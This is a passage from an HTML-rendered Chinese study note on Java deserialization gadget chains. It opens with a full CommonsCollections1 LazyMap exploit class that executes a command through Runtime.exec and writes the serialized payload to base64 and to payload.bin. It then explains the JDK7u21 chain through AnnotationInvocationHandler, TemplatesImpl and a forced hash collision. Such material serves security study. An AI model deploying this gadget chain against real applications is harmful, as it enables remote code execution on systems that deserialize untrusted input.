<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1_LazyMap</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);
        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        <span class="hljs-comment">// CommonsCollections 4.0, LazyMap &#x4E0D;&#x5B58;&#x5728; decorate &#x65B9;&#x6CD5;</span>
        <span class="hljs-comment">// Map lazyMap = LazyMap.lazyMap(innerMap,transformerChain);</span>
        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(<span class="hljs-keyword">true</span>);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);
        Map ProxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]{Map.class}, invocationHandler);
        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);
        Object cc1 = constructor.newInstance(Retention.class, ProxyMap);

        <span class="hljs-comment">// &#x5B57;&#x8282;&#x8C03;&#x7528;&#x5199;&#x6CD5;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(cc1);
        oos.close();
        System.out.println(Base64.encodeBase64String(barr.toByteArray()));
        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();

        <span class="hljs-comment">// &#x5199;&#x6587;&#x4EF6;&#x5199;&#x6CD5;</span>
        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(cc1);
        objectOutputStream.flush();
        objectOutputStream.close();
        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }
}
</code></pre>
<h2 id="&#x5229;&#x7528;templatesimpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><strong>&#x5229;&#x7528;</strong>TemplatesImpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</h2>
<h3 id="jdk7u21&#x7684;&#x7406;&#x89E3;">JDK7u21&#x7684;&#x7406;&#x89E3;</h3>
<p>&#x53C2;&#x8003;: </p>
<ul>
<li><a href="https://www.anquanke.com/post/id/222630" target="_blank">https://www.anquanke.com/post/id/222630</a></li>
<li><a href="https://lalajun.github.io/2019/11/30/JDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets%207u21/" target="_blank">https://lalajun.github.io/2019/11/30/JDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets%207u21/</a></li>
<li><a href="https://xz.aliyun.com/t/8050" target="_blank">https://xz.aliyun.com/t/8050</a></li>
</ul>
<h4 id="tfactory">_tfactory</h4>
<p>&#x770B;&#x4E00;&#x4E2A;&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;&#x8BF4;&#x662F;&#x5728;<code>defineTransletClasses()</code>&#x65F6;&#x4F1A;&#x8C03;&#x7528;<code>getExternalExtensionsMap()</code>,&#x5F53;&#x4E3A;null&#x65F6;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x5BF9;<code>_tfactory</code> &#x8BBE;&#x503C;&#x3002;&#x4F46;&#x662F;&#x6211;&#x5728;&#x67E5;&#x8BE2;&#x7684;&#x65F6;&#x5019;&#x5E76;&#x672A;&#x770B;&#x5230;<code>getExternalExtensionsMap</code>&#x65B9;&#x6CD5;&#xFF0C;&#x800C;&#x4E14;&#x5728;yso&#x91CC;&#x9762;&#x5C06;&#x8BBE;&#x7F6E;<code>_tfactory</code> &#x503C;&#x7684;&#x4EE3;&#x7801;&#x7ED9;&#x6CE8;&#x91CA;&#x4E86;&#x4E00;&#x6837;&#x80FD;&#x6B63;&#x5E38;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x3002;</p>
<p>&#x5728;&#x5176;&#x5B83;&#x5E08;&#x5085;&#x4E0B;&#x627E;&#x5230;&#x7684;&#x4EE3;&#x7801;, &#x5982;&#x679C;&#x6B64;&#x5904; return &#x5982;&#x4E0B;&#x6240;&#x793A;&#x5219;&#x9700;&#x8981;&#x4E3A; <code>_tfactory</code> &#x8D4B;&#x503C;</p>
<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span>
        <span class="hljs-keyword">throws</span> TransformerConfigurationException </span>{

        <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-keyword">null</span>) {
            ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());
        }

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction() {
                <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>{
                    <span class="hljs-comment">// setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span>
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });
...
</code></pre>
<p>&#x8FD8;&#x6709;&#x5BF9;&#x4E8E; <code>_auxClasses</code> &#x7684;&#x8D4B;&#x503C;&#x5176;&#x5B9E;&#x4E5F;&#x6CA1;&#x5FC5;&#x8981;&#x8003;&#x8651;, &#x6CE8;&#x91CA;&#x6389;&#x4E00;&#x6837;&#x53EF;&#x4EE5;&#x547D;&#x4EE4;&#x6267;&#x884C;.</p>
<h4 id="&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x673A;&#x5236;">&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x673A;&#x5236;</h4>
<p>&#x5176;&#x6B21;&#x5C31;&#x662F;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x673A;&#x5236;, &#x901A;&#x8FC7;&#x521B;&#x5EFA;AnnotationInvocationHandler&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;, Proxy&#x4EE3;&#x7406;&#x89E6;&#x53D1;Map&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#x8FDB;&#x800C;&#x8C03;&#x7528;AnnotationInvocationHandler&#x4E2D;&#x7684;invoke&#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object var1, Method var2, Object[] var3)</span> </span>{
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="hljs-number">1</span> &amp;&amp; var5[<span class="hljs-number">0</span>] == Object.class) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.equalsImpl(var3[<span class="hljs-number">0</span>]);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">assert</span> var5.length == <span class="hljs-number">0</span>;

            <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;toString&quot;</span>)) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.toStringImpl();
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.hashCodeImpl();
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;annotationType&quot;</span>)) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.type;
            } <span class="hljs-keyword">else</span> {
                Object var6 = <span class="hljs-keyword">this</span>.memberValues.get(var4);
                <span class="hljs-keyword">if</span> (var6 == <span class="hljs-keyword">null</span>) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IncompleteAnnotationException(<span class="hljs-keyword">this</span>.type, var4);
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var6 <span class="hljs-keyword">instanceof</span> ExceptionProxy) {
                    <span class="hljs-keyword">throw</span> ((ExceptionProxy)var6).generateException();
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="hljs-number">0</span>) {
                        var6 = <span class="hljs-keyword">this</span>.cloneArray(var6);
                    }

                    <span class="hljs-keyword">return</span> var6;
                }
            }
        }
    }
</code></pre>
<p>&#x5728;<code>invoke</code>&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x4F20;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#x540D;&#x662F;<code>equals</code>&#x800C;&#x4E14;&#x65B9;&#x6CD5;&#x7684;&#x53C2;&#x6570;&#x5217;&#x8868;&#x53EA;&#x6709;&#x4E00;&#x4E2A;<code>Object</code>&#x5BF9;&#x8C61;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;<code>equalsImpl()</code>&#x65B9;&#x6CD5; </p>
<pre><code class="lang-java"><span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="hljs-number">1</span> &amp;&amp; var5[<span class="hljs-number">0</span>] == Object.class) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.equalsImpl(var3[<span class="hljs-number">0</span>]);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">assert</span> var5.length == <span class="hljs-number">0</span>;
</code></pre>
<p>&#x8DDF;&#x8FDB;<code>equalsImpl()</code>&#x65B9;&#x6CD5; </p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> Boolean <span class="hljs-title">equalsImpl</span><span class="hljs-params">(Object var1)</span> </span>{
        <span class="hljs-comment">/*&#x5728;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x83B7;&#x53D6;&#x5230;2&#x4E2A;&#x65B9;&#x6CD5;&#x3002;&#x5728;&#x540E;&#x9762;&#x8FD8;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E00;&#x4E2A;for&#x5FAA;&#x73AF;&#xFF0C;&#x7136;&#x540E;&#x4F1A;&#x904D;&#x5386;var2&#x7684;&#x503C;&#x3002;&#x7136;&#x540E;&#x4E0B;&#x9762;&#x4F7F;&#x7528;var8 = var5.invoke(var1);
&#x53CD;&#x5C04;&#x53BB;&#x8C03;&#x7528;&#xFF0C;&#x8FD9;&#x91CC;&#x4F20;&#x5165;&#x7684;var1&#x662F;TemplatesImpl&#x7684;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x3002;*/</span>
        <span class="hljs-keyword">if</span> (var1 == <span class="hljs-keyword">this</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.type.isInstance(var1)) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        } <span class="hljs-keyword">else</span> {
            Method[] var2 = <span class="hljs-keyword">this</span>.getMemberMethods();
            <span class="hljs-keyword">int</span> var3 = var2.length;

            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var4 = <span class="hljs-number">0</span>; var4 &lt; var3; ++var4) {
                Method var5 = var2[var4];
                String var6 = var5.getName();
                Object var7 = <span class="hljs-keyword">this</span>.memberValues.get(var6);
                Object var8 = <span class="hljs-keyword">null</span>;
                AnnotationInvocationHandler var9 = <span class="hljs-keyword">this</span>.asOneOfUs(var1);
                <span class="hljs-keyword">if</span> (var9 != <span class="hljs-keyword">null</span>) {
                    var8 = var9.memberValues.get(var6);
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-comment">/*var8 = var5.invoke(var1); &#x8BED;&#x53E5;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8C03;&#x7528; var1 &#x5BF9;&#x8C61;&#x7684; var5 &#x65B9;&#x6CD5;&#x3002;&#x8DDF;&#x8E2A;&#x4E00;&#x4E0B;getMemberMethods&#x65B9;&#x6CD5;&#x5C31;&#x77E5;&#x9053;*/</span>
                        var8 = var5.invoke(var1);
                    } <span class="hljs-keyword">catch</span> (InvocationTargetException var11) {
                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
                    } <span class="hljs-keyword">catch</span> (IllegalAccessException var12) {
                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AssertionError(var12);
                    }
                }

                <span class="hljs-keyword">if</span> (!memberValueEquals(var7, var8)) {
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
                }
            }

            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
        }
    }
</code></pre>
<p>&#x524D;&#x4E24;&#x4E2A;if&#x4E0D;&#x7528;&#x7BA1;&#xFF0C;&#x76F4;&#x63A5;&#x770B;else&#x3002;&#x901A;&#x8FC7;<code>getMemberMethods</code>&#x5F97;&#x5230;&#x4E00;&#x4E2A;<code>Method[]</code>&#xFF1A; </p>
<pre><code class="lang-java">    <span class="hljs-keyword">private</span> Method[] getMemberMethods() {
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.memberMethods == <span class="hljs-keyword">null</span>) {
            <span class="hljs-keyword">this</span>.memberMethods = (Method[])AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction&lt;Method[]&gt;() {
                <span class="hljs-keyword">public</span> Method[] run() {
                    Method[] var1 = AnnotationInvocationHandler.<span class="hljs-keyword">this</span>.type.getDeclaredMethods();
                    AccessibleObject.setAccessible(var1, <span class="hljs-keyword">true</span>);
                    <span class="hljs-keyword">return</span> var1;
                }
            });
        }

        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.memberMethods;
</code></pre>
<p>&#x7136;&#x540E;&#x8FDB;&#x5165;for&#x5FAA;&#x73AF;&#xFF0C;&#x904D;&#x5386;&#x8FD9;&#x4E2A;<code>Method[]</code>&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;&#x65B9;&#x6CD5; </p>
<pre><code class="lang-java"><span class="hljs-keyword">if</span> (var9 != <span class="hljs-keyword">null</span>) {
    var8 = var9.memberValues.get(var6);
</code></pre>
<p>&#x8FD9;&#x91CC;&#x7684;<code>Method[]</code>&#x53EA;&#x80FD;&#x662F;&#x901A;&#x8FC7;<code>this.type</code>&#x6765;&#x5F97;&#x5230; </p>
<pre><code class="lang-java">Method[] var1 = AnnotationInvocationHandler.<span class="hljs-keyword">this</span>.type.getDeclaredMethods();
<span class="hljs-comment">//&#x5728;&#x8FD9;&#x91CC;&#x7684;this.type&#x662F;templates&#x5BF9;&#x8C61;&#xFF0C;&#x4F7F;&#x7528;getDeclaredMethods&#x53CD;&#x5C04;&#x83B7;&#x53D6;&#x65B9;&#x6CD5;</span>
</code></pre>
<p>&#x56E0;&#x4E3A;<code>memberMethods</code>&#x5C5E;&#x6027;&#x662F;&#x4E2A;&#x77AC;&#x6001;&#x5C5E;&#x6027;&#x4E0D;&#x53EF;&#x63A7;&#x3002;</p>
<pre><code class="lang-java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Method[] memberMethods = <span class="hljs-keyword">null</span>;
</code></pre>
<p>&#x603B;&#x7684;&#x6765;&#x8BF4;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x5C31;&#x662F;&#xFF0C;&#x5F97;&#x5230;this.type&#x7684;&#x6240;&#x6709;Method[]&#xFF0C;&#x7136;&#x540E;&#x4F9D;&#x6B21;&#x8C03;&#x7528;&#x6240;&#x6709;&#x3002;&#x5982;&#x679C;&#x8BA9;this.type&#x662F;TemplatesImpl&#x7684;&#x7C7B;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x81EA;&#x7136;&#x4F1A;&#x8C03;&#x7528;&#x5230;newTransformer&#x6216;&#x8005;getOutputProperties&#x3002;&#x800C;invoke&#x7684;&#x90A3;&#x4E2A;&#x53C2;&#x6570;var1&#x4E5F;&#x5C31;&#x662F;&#x8C03;&#x7528;&#x65B9;&#x6CD5;&#x7684;&#x5BF9;&#x8C61;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;var1&#x9700;&#x8981;&#x662F;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;&#x6076;&#x610F;&#x7684;TemplatesImpl&#x5BF9;&#x8C61;</p>
<p><img src="img/1641982599533.png" alt="1641982599533"></p>
<p>&#x89E6;&#x53D1;getOutputProperties&#x65B9;&#x6CD5;&#x540E;&#x8FDB;&#x800C;&#x5230;newTransformer&#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();
        }
        <span class="hljs-keyword">catch</span> (TransformerConfigurationException e) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
        }
    }
</code></pre>
<p>&#x901A;&#x8FC7;getTransletInstance&#x65B9;&#x6CD5;&#x8FDB;&#x800C;&#x6267;&#x884C;&#x9759;&#x6001;&#x5757;, &#x9759;&#x6001;&#x5757;&#x6267;&#x884C;&#x7684;&#x6B65;&#x9AA4;&#x53C2;&#x8003;CC2&#x94FE;&#x7684;&#x8DDF;&#x8FDB;</p>
<h4 id="linkedhashset">LinkedHashSet</h4>
<p>jdk7u21&#x4E3B;&#x8981;&#x7684;&#x7CBE;&#x534E;&#x4E4B;&#x5904;&#x5728;&#x4E8E;&#x627E;equals&#x548C;&#x53E6;&#x4E00;&#x4E2A;hash&#x503C;&#x7684;&#x6784;&#x9020;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>{
        <span class="hljs-comment">// key&#x53EA;&#x8981;&#x8D4B;&#x503C;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x6B64;if</span>
        <span class="hljs-keyword">if</span> (key == <span class="hljs-keyword">null</span>)
            <span class="hljs-keyword">return</span> putForNullKey(value);
        <span class="hljs-keyword">int</span> hash = hash(key);
        <span class="hljs-keyword">int</span> i = indexFor(hash, table.length);
        <span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="hljs-keyword">null</span>; e = e.next) {
            Object k;
            <span class="hljs-comment">// &#x5982;&#x679C;key&#x8D4B;&#x503C;&#x4E3A;TemplatesImpl&#x5BF9;&#x8C61;&#xFF0C;&#x524D;&#x9762;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#xFF0C;&#x8FD9;&#x91CC;&#x8C03;&#x7528;key.equals&#x5C31;&#x4F1A;&#x89E6;&#x53D1;&#x5230;AnnotationInvocationHandler&#x7684;invoke&#x65B9;&#x6CD5;</span>
            <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
                V oldValue = e.value;
                e.value = value;
                e.recordAccess(<span class="hljs-keyword">this</span>);
                <span class="hljs-keyword">return</span> oldValue;
            }
        }

        modCount++;
        addEntry(hash, key, value, i);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
    }
</code></pre>
<p>&#x8BA1;&#x7B97;hash&#x503C;&#x7684;&#x6D41;&#x7A0B;&#x53EF;&#x4EE5;&#x7B80;&#x5316;&#x4E3A;</p>
<pre><code class="lang-java">        <span class="hljs-keyword">int</span> hash = hash(key);
        <span class="hljs-keyword">int</span> i = indexFor(hash, table.length);


        <span class="hljs-keyword">int</span> h = <span class="hljs-number">0</span>;
        h ^= k.hashCode();
        h ^= (h &gt;&gt;&gt; <span class="hljs-number">20</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">12</span>);
        h ^ (h &gt;&gt;&gt; <span class="hljs-number">7</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">4</span>);

        h &amp; <span class="hljs-number">15</span>;
</code></pre>
<p>&#x6700;&#x540E;&#x7684;<code>return h &amp; (length-1);</code>&#x662F;<code>h&amp;15</code>&#xFF0C;&#x662F;&#x56E0;&#x4E3A;<code>HashMap</code>&#x7684;&#x9ED8;&#x8BA4;<code>length</code>&#x662F;16 </p>
<pre><code class="lang-java">    <span class="hljs-comment">/**
     * The default initial capacity - MUST be a power of two.
     */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> DEFAULT_INITIAL_CAPACITY = <span class="hljs-number">16</span>;
</code></pre>
<p>&#x4ECE;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x6765;&#x770B;&#xFF0C;&#x60F3;&#x63A7;&#x5236;hash&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x662F;&#x8981;&#x8BA9;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;&#x7684;hashCode()&#x548C;TemplatesImpl&#x5BF9;&#x8C61;&#x7684;hashCode()&#x76F8;&#x540C;&#x3002;&#x4F46;&#x662F;TemplatesImpl&#x7684;hashCode()&#x662F;&#x4E2A;Native()&#x65B9;&#x6CD5;&#xFF0C;&#x6BCF;&#x6B21;&#x8FD0;&#x884C;&#x90FD;&#x4F1A;&#x6539;&#x53D8;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x53EF;&#x63A7;&#x3002;</p>
<p>&#x518D;&#x60F3;&#x60F3;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;&#x7684;hashCode()&#x3002;&#x5F88;&#x660E;&#x663E;&#x4E5F;&#x5F97;&#x7ECF;&#x8FC7;invoke&#xFF0C;&#x8FDB;&#x5165;hashCodeImpl</p>
<pre><code class="lang-java">    <span class="hljs-comment">// HashMap&#x901A;&#x8FC7; k.hashCode &#x89E6;&#x53D1; AnnotationInvocationHandler &#x7684;invoke&#x65B9;&#x6CD5;&#x8FDB;&#x800C;&#x89E6;&#x53D1;&#x5176;hashCode</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.hashCodeImpl();
            } 
...
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCodeImpl</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">int</span> var1 = <span class="hljs-number">0</span>;

        Entry var3;
        <span class="hljs-keyword">for</span>(Iterator var2 = <span class="hljs-keyword">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); var1 += <span class="hljs-number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
            var3 = (Entry)var2.next();
        }

        <span class="hljs-keyword">return</span> var1;
    }
</code></pre>
<p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x904D;&#x5386;<code>this.memberValues</code>&#x8FD9;&#x4E2A;<code>Map</code>&#xFF0C;&#x628A;&#x6BCF;&#x6B21;&#x8BA1;&#x7B97;&#x51FA;&#x6765;&#x7684;<code>127*(key&#x7684;hash)^(value&#x7684;hash)</code> , &#x4F5C;&#x8005;&#x7684;&#x601D;&#x8DEF;: </p>
<blockquote>
<p>&#x8BA9;<code>memberValues</code>&#x8FD9;&#x4E2A;Map&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x8BA9;<code>key</code>&#x7684;hash&#x4E3A;0&#xFF0C;&#x8FD9;&#x6837;127*0=0&#xFF0C;&#x7136;&#x540E;0^xxx&#x4ECD;&#x7136;&#x662F;xxx&#xFF08;&#x76F8;&#x540C;&#x4E3A;0&#xFF0C;&#x4E0D;&#x540C;&#x4E3A;1&#xFF09;&#x3002;&#x518D;&#x8BA9;value&#x662F;&#x6076;&#x610F;&#x7684;<code>TemplatesImpl</code>&#x5BF9;&#x8C61;&#xFF0C;&#x8FD9;&#x6837;&#x8BA1;&#x7B97;&#x7684;&#x5C31;&#x662F;&#x90A3;&#x4E2A;<code>TemplatesImpl</code>&#x5BF9;&#x8C61;&#x7684;hash&#x503C;&#xFF0C;&#x81EA;&#x7136;&#x5C31;&#x76F8;&#x540C;&#x4E86;</p>
</blockquote>
<p>&#x81F3;&#x4E8E;<code>hash</code>&#x4E3A;0&#x7684;&#x952E;&#xFF0C;&#x901A;&#x8FC7;&#x7206;&#x7834;&#x627E;&#x5230;&#x7684;&#x662F;<code>f5a5a608</code></p>
<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">bruteHashCode</span><span class="hljs-params">()</span> </span>{ 
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">long</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9999999999L</span>; i++) { 
        <span class="hljs-keyword">if</span> (Long.toHexString(i).hashCode() == <span class="hljs-number">0</span>) { 
            System.out.println(Long.toHexString(i)); 
        } 
    } 
}
</code></pre>
<p><strong>&#x4E3A;&#x4EC0;&#x4E48;&#x4F7F;&#x7528;LinkedHashSet?</strong></p>
<ul>
<li>LinkedHashSet &#x662F; Set &#x7684;&#x4E00;&#x4E2A;&#x5177;&#x4F53;&#x5B9E;&#x73B0;&#xFF0C;&#x5176;&#x7EF4;&#x62A4;&#x7740;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x4E8E;&#x6240;&#x6709;&#x6761;&#x76EE;&#x7684;&#x53CC;&#x91CD;&#x94FE;&#x63A5;&#x5217;&#x8868;&#x3002;&#x6B64;&#x94FE;&#x63A5;&#x5217;&#x8868;&#x5B9A;&#x4E49;&#x4E86;&#x8FED;&#x4EE3;&#x987A;&#x5E8F;&#xFF0C;&#x8BE5;&#x8FED;&#x4EE3;&#x987A;&#x5E8F;&#x53EF;&#x4E3A;&#x63D2;&#x5165;&#x987A;&#x5E8F;&#x6216;&#x662F;&#x8BBF;&#x95EE;&#x987A;&#x5E8F;&#x3002;</li>
